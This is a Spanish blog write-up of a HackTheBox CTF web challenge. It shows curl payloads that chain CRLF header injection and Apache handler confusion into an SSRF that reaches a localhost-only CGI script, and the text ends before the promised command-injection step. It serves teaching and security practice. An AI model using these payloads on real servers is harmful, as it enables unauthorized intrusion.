<!DOCTYPE html>
<html lang="es">
<head>
  
    <title>HTB Cyber Apocalypse 2025 | CyberAttack WriteUp :: Hackers Fight Club Blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Introducción Recientemente se llevó a cabo el CTF anual de HackTheBox &ldquo;Cyber Apocalypse&rdquo;. Uno de los retos que más me gustó dentro de la categoría Web fue &ldquo;Cyber Attack&rdquo;. Como todos los retos de este CTF, este está ambientado en el mundo fantástico de Eldoria. Se nos presenta una aplicación web destinada a atacar a los enemigos de Malakar.
A grandes rasgos, el reto requería explotar una inyección CRLF, una vulnerabilidad de tipo SSRF y una inyección de comandos. Adicionalmente para lograr resolverlo, fue necesario comprender algo llamado &ldquo;ambigüedad semántica&rdquo; en servidores Apache y aplicar un pequeño truco en IPv6 para conseguir inyectar comandos. Para resolver el reto, se nos provee el código fuente de la aplicación y archivos de configuración del servidor web.
" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://albertnath.github.io/hfc-blog/posts/htb_cyber_apocalypse_2025_cyberattack/" />





  
  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/code.min.4f0ccc8439f99bf7f7970298556b94011aabc1fcae743b6842fc3361a2da9ea3.css">

  
  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">

  
  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/main.min.61ebeff97afe3635753dcda5e0c7a822cb4d2ca9a4e662b6736ffb5a39b2f99a.css">

  
  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css">

  
  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css">

  
  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css">

  
  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">

  
  <link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">


<link rel="stylesheet" href="https://albertnath.github.io/hfc-blog/terminal.css">




<link rel="shortcut icon" href="https://albertnath.github.io/hfc-blog/favicon.png">
<link rel="apple-touch-icon" href="https://albertnath.github.io/hfc-blog/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="vir" />



<meta property="og:locale" content="es" />
<meta property="og:type" content="article" />
<meta property="og:title" content="HTB Cyber Apocalypse 2025 | CyberAttack WriteUp">
<meta property="og:description" content="Introducción Recientemente se llevó a cabo el CTF anual de HackTheBox &ldquo;Cyber Apocalypse&rdquo;. Uno de los retos que más me gustó dentro de la categoría Web fue &ldquo;Cyber Attack&rdquo;. Como todos los retos de este CTF, este está ambientado en el mundo fantástico de Eldoria. Se nos presenta una aplicación web destinada a atacar a los enemigos de Malakar.
A grandes rasgos, el reto requería explotar una inyección CRLF, una vulnerabilidad de tipo SSRF y una inyección de comandos. Adicionalmente para lograr resolverlo, fue necesario comprender algo llamado &ldquo;ambigüedad semántica&rdquo; en servidores Apache y aplicar un pequeño truco en IPv6 para conseguir inyectar comandos. Para resolver el reto, se nos provee el código fuente de la aplicación y archivos de configuración del servidor web.
" />
<meta property="og:url" content="https://albertnath.github.io/hfc-blog/posts/htb_cyber_apocalypse_2025_cyberattack/" />
<meta property="og:site_name" content="Hackers Fight Club Blog" />

  <meta property="og:image" content="https://albertnath.github.io/hfc-blog/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2025-05-15 13:21:10 -0600 CST" />












</head>
<body>


<div class="container center">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="https://albertnath.github.io/hfc-blog/">
  <div class="logo">
    Hackers Fight Club Blog
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="https://albertnath.github.io/hfc-blog/acerca-de">Acerca De</a></li>
        
      
        
          <li><a href="https://albertnath.github.io/hfc-blog/authors">Autores</a></li>
        
      
        
          <li><a href="https://albertnath.github.io/hfc-blog/tags">Categorías</a></li>
        
      
        
          <li><a href="https://albertnath.github.io/hfc-blog/posts">Posts</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="https://albertnath.github.io/hfc-blog/acerca-de" >Acerca De</a></li>
        
      
        
          <li><a href="https://albertnath.github.io/hfc-blog/authors" >Autores</a></li>
        
      
        
          <li><a href="https://albertnath.github.io/hfc-blog/tags" >Categorías</a></li>
        
      
        
          <li><a href="https://albertnath.github.io/hfc-blog/posts" >Posts</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://albertnath.github.io/hfc-blog/posts/htb_cyber_apocalypse_2025_cyberattack/">HTB Cyber Apocalypse 2025 | CyberAttack WriteUp</a>
  </h1>
  <div class="post-meta"><time class="post-date">15-05-2025</time><span class="post-author">vir</span><span class="post-reading-time">9 min. de lectura (1871 palabras)</span></div>

  
    <span class="post-tags">
      
      #<a href="https://albertnath.github.io/hfc-blog/tags/writeup/">Writeup</a>&nbsp;
      
      #<a href="https://albertnath.github.io/hfc-blog/tags/web/">Web</a>&nbsp;
      
    </span>
  
  


  

  <div class="post-content"><div>
        <h2 id="introducción">Introducción<a href="#introducción" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Recientemente se llevó a cabo el CTF anual de HackTheBox &ldquo;Cyber Apocalypse&rdquo;. Uno de los retos que más me gustó dentro de la categoría Web fue &ldquo;Cyber Attack&rdquo;. Como todos los retos de este CTF, este está ambientado en el mundo fantástico de Eldoria. Se nos presenta una aplicación web destinada a atacar a los enemigos de Malakar.</p>
<p>A grandes rasgos, el reto requería explotar una inyección CRLF, una vulnerabilidad de tipo SSRF y una inyección de comandos. Adicionalmente para lograr resolverlo, fue necesario comprender algo llamado &ldquo;ambigüedad semántica&rdquo; en servidores Apache y aplicar un pequeño truco en IPv6 para conseguir inyectar comandos. Para resolver el reto, se nos provee el código fuente de la aplicación y archivos de configuración del servidor web.</p>
<h2 id="desarrollo">Desarrollo<a href="#desarrollo" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>La aplicación muestra un formulario permite introducir el nombre del usuario y el nombre de dominio o dirección IP a atacar. El siguiente ejemplo muestra el funcionamiento de la aplicación al usarla para atacar un nombre de dominio.</p>

<img src="https://albertnath.github.io/hfc-blog/img/htb_cyber_apocalypse_2025_cyberattack/img1.png"  alt="img1"  class="center"    />


<p>Al enviar el formulario, regresa un mensaje indicando que el ataque fue exitoso. Dicho mensaje se obtiene del parámetro <code>result</code> en la URL.</p>

<img src="https://albertnath.github.io/hfc-blog/img/htb_cyber_apocalypse_2025_cyberattack/img2.png"  alt="img1"  class="center"    />


<p>El siguiente ejemplo muestra el uso de la funcionalidad de atacar una dirección IP.</p>

<img src="https://albertnath.github.io/hfc-blog/img/htb_cyber_apocalypse_2025_cyberattack/img3.png"  alt="img1"  class="center"    />


<p>Sin embargo, en este caso recibimos un error <em>Forbidden</em>, pues no tenemos permitido interactuar con el recurso <code>/cgi-bin/attack-ip</code>.</p>

<img src="https://albertnath.github.io/hfc-blog/img/htb_cyber_apocalypse_2025_cyberattack/img4.png"  alt="img1"  class="center"    />


<p>Esto se entiende al ver el archivo de configuración <code>apache2.conf</code>, pues permite la interacción con dicho script únicamente si la petición HTTP se origina en el propio servidor:</p>
<pre tabindex="0"><code>ServerName CyberAttack

AddType application/x-httpd-php .php

&lt;Location &#34;/cgi-bin/attack-ip&#34;&gt;
Order deny,allow
Deny from all
Allow from 127.0.0.1
Allow from ::1
&lt;/Location&gt;
</code></pre><p>A continuación, se muestra el código fuente de ambos scripts y algunas conclusiones a las que llegué después de analizarlo.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cgi
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_domain</span>(target):
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> re<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;^(?!-)[a-zA-Z0-9-]{1,63}(?&lt;!-)\.[a-zA-Z]{2,63}$&#39;</span>, target)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>form <span style="color:#f92672">=</span> cgi<span style="color:#f92672">.</span>FieldStorage()
</span></span><span style="display:flex;"><span>name <span style="color:#f92672">=</span> form<span style="color:#f92672">.</span>getvalue(<span style="color:#e6db74">&#39;name&#39;</span>)
</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> form<span style="color:#f92672">.</span>getvalue(<span style="color:#e6db74">&#39;target&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> name <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> target:
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#39;Location: ../?error=Hey, you need to provide a name and a target!&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> is_domain(target):
</span></span><span style="display:flex;"><span>  count <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#75715e"># Increase this for an actual attack</span>
</span></span><span style="display:flex;"><span>  os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ping -c </span><span style="color:#e6db74">{</span>count<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Location: ../?result=Succesfully attacked </span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">!&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Location: ../?error=Hey </span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">, watch it!&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Content-Type: text/html&#39;</span>)
</span></span><span style="display:flex;"><span>print()
</span></span></code></pre></div><ul>
<li>Se utiliza el comando <code>ping</code> para atacar el servicio que se le indica.</li>
<li>Parece haber una inyección de comandos, pues el parámetro <code>target</code> se usa en la función <code>os.popen()</code>. Sin embargo, el mismo parámetro primero se verifica con una expresión regular y, si no tiene el formato de un nombre de dominio, no se ejecuta la función.</li>
<li>En caso de no pasar la verificación, la respuesta HTTP será una redirección a través del encabezado <code>Location</code>, en donde se envía un mensaje de error concatenando el nombre del usuario. Al hacer esta concatenación en un encabezado, podría ser vulnerable a una inyección <em>CRLF</em>.</li>
<li>Una interacción con este recurso se muestra a continuación, forzando un error al enviar un nombre de dominio inválido.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v&#39;</span>
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;html&gt;&lt;head&gt;
</span></span><span style="display:flex;"><span>&lt;title&gt;302 Found&lt;/title&gt;
</span></span><span style="display:flex;"><span>&lt;/head&gt;&lt;body&gt;
</span></span><span style="display:flex;"><span>&lt;h1&gt;Found&lt;/h1&gt;
</span></span><span style="display:flex;"><span>&lt;p&gt;The document has moved &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../?error=Hey v, watch it!&#34;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;
</span></span><span style="display:flex;"><span>&lt;hr&gt;
</span></span><span style="display:flex;"><span>&lt;address&gt;Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span> Server at 83.136.249.227 Port 46378&lt;/address&gt;
</span></span><span style="display:flex;"><span>&lt;/body&gt;&lt;/html&gt;
</span></span></code></pre></div><p><strong>attack-ip:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cgi
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ipaddress <span style="color:#f92672">import</span> ip_address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>form <span style="color:#f92672">=</span> cgi<span style="color:#f92672">.</span>FieldStorage()
</span></span><span style="display:flex;"><span>name <span style="color:#f92672">=</span> form<span style="color:#f92672">.</span>getvalue(<span style="color:#e6db74">&#39;name&#39;</span>)
</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> form<span style="color:#f92672">.</span>getvalue(<span style="color:#e6db74">&#39;target&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> name <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> target:
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#39;Location: ../?error=Hey, you need to provide a name and a target!&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>  count <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#75715e"># Increase this for an actual attack</span>
</span></span><span style="display:flex;"><span>  os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ping -c </span><span style="color:#e6db74">{</span>count<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>ip_address(target)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Location: ../?result=Succesfully attacked </span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">!&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Location: ../?error=Hey </span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">, watch it!&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Content-Type: text/html&#39;</span>)
</span></span><span style="display:flex;"><span>print()
</span></span></code></pre></div><ul>
<li>El funcionamiento es muy similar al caso anterior, pero con pequeñas variaciones.</li>
<li>Se utiliza nuevamente el comando <code>ping</code> para atacar la dirección IP indicada.</li>
<li>En este caso, también parece haber una inyección de comandos, pues el parámetro <code>target</code> se usa en la función <code>os.popen()</code>, pero en este caso hay una validación con la función <code>ip_address()</code>. Esta función genera una excepción si la cadena recibida no tiene el formato de una dirección IPv4 o IPv6 válida.</li>
<li>En caso de generarse la excepción, no realiza el ataque y envía una redirección con un mensaje de error en el encabezado <code>Location</code>.</li>
</ul>
<p>Llegados a este punto, tenía claro que el único recurso con el que podría interactuar directamente era <code>/cgi-bin/attack-domain</code> y que debía lograr interactuar con <code>/cgi-bin/attack-ip</code> (ya que su acceso estaba limitado). Aunque buscaba alguna manera de forzar un <em>SSRF</em>, al inicio únicamente era capaz de inyectar encabezados HTTP en la respuesta. Esto lo muestro a continuación, logrando que la respuesta incluyera el nuevo encabezado <code>New-Header: HFC</code> inyectando los caracteres de retorno de carro y salto de línea <code>(%0d%0a)</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ curl -i <span style="color:#e6db74">&#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aNew-Header:HFC%0d%0a%0d%0a&#39;</span>
</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">302</span> Found
</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">26</span> Mar <span style="color:#ae81ff">2025</span> 03:14:46 GMT
</span></span><span style="display:flex;"><span>Server: Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>New-Header: HFC
</span></span><span style="display:flex;"><span>Location: ../?error<span style="color:#f92672">=</span>Hey v
</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">282</span>
</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;html&gt;&lt;head&gt;
</span></span><span style="display:flex;"><span>&lt;title&gt;302 Found&lt;/title&gt;
</span></span><span style="display:flex;"><span>&lt;/head&gt;&lt;body&gt;
</span></span><span style="display:flex;"><span>&lt;h1&gt;Found&lt;/h1&gt;
</span></span><span style="display:flex;"><span>&lt;p&gt;The document has moved &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../?error=Hey v&#34;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;
</span></span><span style="display:flex;"><span>&lt;hr&gt;
</span></span><span style="display:flex;"><span>&lt;--REDACTED--&gt;
</span></span></code></pre></div><p>Después de un buen rato de buscar algún recurso que pudiera servirme, llegué a este <a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">sitio</a>. Aquí se detalla el término de &ldquo;ambigüedad semántica&rdquo; en servidores Apache. A grandes rasgos, explica que Apache funciona mediante una gran cantidad de módulos. Estos módulos no necesariamente tienen una forma estandarizada de interpretar los campos que van a procesar, provocando ambigüedades en cómo lo manipulan.</p>
<p>El sitio detalla 3 tipos diferentes de ataques desarrollados a partir de dicha ambigüedad, pero para este reto utilicé únicamente el llamado <em>Handler Confusion</em>, donde se busca invocar algún <em>handler</em> de Apache de forma arbitraria. Para comprender correctamente el origen e implicaciones del problema, se recomienda leer el artículo original. A continuación, únicamente agregaré una explicación muy resumida de esto, esperando que sea suficiente para comprender la solución al reto.</p>
<p>El autor explica que al utilizar el módulo <code>mod_php</code>, hay dos directivas que se parecen mucho en funcionalidad, pero que representan campos diferentes dentro de la estructura de httpd:</p>
<p><strong>Directivas:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>AddHandler application/x-httpd-php .php
</span></span><span style="display:flex;"><span>AddType    application/x-httpd-php .php
</span></span></code></pre></div><p><strong>Sintaxis:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>AddHandler handler-name extensión <span style="color:#f92672">[</span>extensión<span style="color:#f92672">]</span> ...
</span></span><span style="display:flex;"><span>AddType media-type extensión <span style="color:#f92672">[</span>extensión<span style="color:#f92672">]</span> ...
</span></span></code></pre></div><p>Aunque tienen una funcionalidad muy similar, realmente <code>handler-name</code> corresponde a la estructura <code>r-&gt;handler</code> y <code>media-type</code> corresponde a <code>r-&gt;content_type</code> dentro de httpd. Algo curioso (y por lo que se parecen tanto) es que tras bambalinas, <code>media-type</code> se termina convirtiendo en <code>handler-name</code>. El autor indica que, en teoría, si se logra controlar el encabezado <code>Content-Type</code> en la respuesta del servidor, es posible invocar cualquier handler de Apache de forma arbitraria.</p>
<p>Sin embargo, el flujo en el que se manejan las peticiones provoca que la conversión de estructuras no se efectúe, a menos que sea el propio servidor quien inicie una nueva petición internamente. Afortunadamente para nosotros, hay escenarios en los que el servidor hace nuevas peticiones internas, uno de ellos es cuando usa el módulo <code>mod_cgi</code>. Si el encabezado HTTP <code>Location</code> inicia con el caracter &lsquo;/&rsquo;, Apache va a tratar este escenario como una redirección del lado del servidor para poder interactuar con el script CGI.</p>
<p>Se puede concluir que para poder invocar cualquier handler de Apache, se necesitan cumplir los siguientes requisitos:</p>
<ul>
<li>
<p>Módulo <code>mod_php</code> habilitado: Se confirma que se cumple, porque el archivo principal de la aplicación es index.php.</p>
</li>
<li>
<p>Módulo <code>mod_cgi</code> habilitado: Se confirma que se cumple, pues la aplicación lo requiere para poder usar los scripts en Python <code>attack-domain</code> y <code>attack-ip</code>.</p>
</li>
<li>
<p>Control sobre encabezados <code>Location</code> y <code>Content-Type</code> en la respuesta del servidor: Se confirma que se cumple, pues en este punto ya fue posible explotar la inyección <em>CRLF</em> para crear encabezados nuevos.</p>
</li>
</ul>
<p>Con todo en su lugar, llegó el momento de usar un handler distinto. Específicamente, se usó <code>server-status</code>, con el único fin de demostrar la viabilidad de la técnica. Como se muestra a continuación, el ataque fue exitoso y fue posible acceder a información del estado del servidor, como consumo de CPU, tráfico total, etc.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ curl -i <span style="color:#e6db74">&#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:server-status%0d%0a%0d%0a&#39;</span>
</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">26</span> Mar <span style="color:#ae81ff">2025</span> 03:16:46 GMT
</span></span><span style="display:flex;"><span>Server: Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Vary: Accept-Encoding
</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">4536</span>
</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>ISO-8859-1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;html&gt;&lt;head&gt;
</span></span><span style="display:flex;"><span>&lt;title&gt;Apache Status&lt;/title&gt;
</span></span><span style="display:flex;"><span>&lt;/head&gt;&lt;body&gt;
</span></span><span style="display:flex;"><span>&lt;h1&gt;Apache Server Status <span style="color:#66d9ef">for</span> 83.136.249.227 <span style="color:#f92672">(</span>via 192.168.63.136<span style="color:#f92672">)</span>&lt;/h1&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;dl&gt;&lt;dt&gt;Server Version: Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span> PHP/7.4.33&lt;/dt&gt;
</span></span><span style="display:flex;"><span>&lt;dt&gt;Server MPM: prefork&lt;/dt&gt;
</span></span><span style="display:flex;"><span>&lt;dt&gt;Server Built: 2022-06-09T04:26:43
</span></span><span style="display:flex;"><span>&lt;/dt&gt;&lt;/dl&gt;&lt;hr /&gt;&lt;dl&gt;
</span></span><span style="display:flex;"><span>&lt;dt&gt;Current Time: Wednesday, 26-Mar-2025 03:16:47 UTC&lt;/dt&gt;
</span></span><span style="display:flex;"><span>&lt;dt&gt;Restart Time: Wednesday, 26-Mar-2025 03:04:40 UTC&lt;/dt&gt;
</span></span><span style="display:flex;"><span>&lt;dt&gt;Parent Server Config. Generation: 1&lt;/dt&gt;
</span></span><span style="display:flex;"><span>&lt;dt&gt;Parent Server MPM Generation: 0&lt;/dt&gt;
</span></span><span style="display:flex;"><span>&lt;dt&gt;Server uptime:  <span style="color:#ae81ff">12</span> minutes <span style="color:#ae81ff">6</span> seconds&lt;/dt&gt;
</span></span><span style="display:flex;"><span>&lt;dt&gt;Server load: 0.15 0.23 0.20&lt;/dt&gt;
</span></span><span style="display:flex;"><span>&lt;dt&gt;Total accesses: <span style="color:#ae81ff">7</span> - Total Traffic: <span style="color:#ae81ff">4</span> kB - Total Duration: 503&lt;/dt&gt;
</span></span><span style="display:flex;"><span>&lt;dt&gt;CPU Usage: u.03 s.03 cu.02 cs.01 - .0124% CPU load&lt;/dt&gt;
</span></span><span style="display:flex;"><span>&lt;dt&gt;.00964 requests/sec - <span style="color:#ae81ff">5</span> B/second - <span style="color:#ae81ff">585</span> B/request - 71.8571 ms/request&lt;/dt&gt;
</span></span><span style="display:flex;"><span>&lt;dt&gt;1 requests currently being processed, <span style="color:#ae81ff">5</span> idle workers&lt;/dt&gt;
</span></span><span style="display:flex;"><span>&lt;--REDACTED--&gt;
</span></span></code></pre></div><p>Una vez confirmado, usé el handler <code>proxy</code> para forzar un <em>SSRF</em> completo, es decir, teniendo control sobre el destino, recurso, parámetros y encabezados de la petición. De esta manera, finalmente fue posible interactuar con <code>attack-ip</code> (pues la petición se origina desde el propio servidor).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ curl -i <span style="color:#e6db74">&#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=127.0.0.1%26name=v%0d%0a%0d%0a&#39;</span>
</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">302</span> Found
</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">26</span> Mar <span style="color:#ae81ff">2025</span> 03:19:21 GMT
</span></span><span style="display:flex;"><span>Server: Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Location: ../?result<span style="color:#f92672">=</span>Succesfully attacked 127.0.0.1!
</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">301</span>
</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;html&gt;&lt;head&gt;
</span></span><span style="display:flex;"><span>&lt;title&gt;302 Found&lt;/title&gt;
</span></span><span style="display:flex;"><span>&lt;/head&gt;&lt;body&gt;
</span></span><span style="display:flex;"><span>&lt;h1&gt;Found&lt;/h1&gt;
</span></span><span style="display:flex;"><span>&lt;p&gt;The document has moved &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../?result=Succesfully attacked 127.0.0.1!&#34;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;
